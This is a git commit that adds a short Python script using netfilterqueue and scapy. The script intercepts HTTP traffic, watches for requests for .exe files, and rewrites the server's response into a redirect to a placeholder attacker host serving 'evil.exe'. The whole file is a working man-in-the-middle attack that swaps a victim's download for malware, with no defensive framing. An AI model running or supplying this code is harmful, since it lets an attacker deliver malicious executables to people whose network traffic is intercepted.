636f97ac3524902fd330758a13124454e295626a
Paweł <110523018+oziesiek@users.noreply.github.com>
2023-07-22 12:20:51 +0200

    Create replace_downloads.py

---
+++ replace_downloads/replace_downloads.py
@@ -0,0 +1,33 @@
+#!/usr/bin/env python
+import netfilterqueue
+import scapy.all as scapy
+
+
+ack_list = []
+
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.Raw):
+        if scapy_packet[scapy.TCP].dport == 80:
+            if b".exe" in scapy_packet[scapy.Raw].load:
+                print("[+] exe Request")
+                ack_list.append(scapy_packet[scapy.TCP].ack)
+        elif scapy_packet[scapy.TCP].sport == 80:
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                print("[+] Replacing file")
+                modified_packet = set_load(scapy_packet, b"HTTP/1.1 301 Moved Permanently\nLocation: http://your_exploit_srv/evil.exe\n\n")
+                packet.set_payload(bytes(modified_packet))
+
+    packet.accept()
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
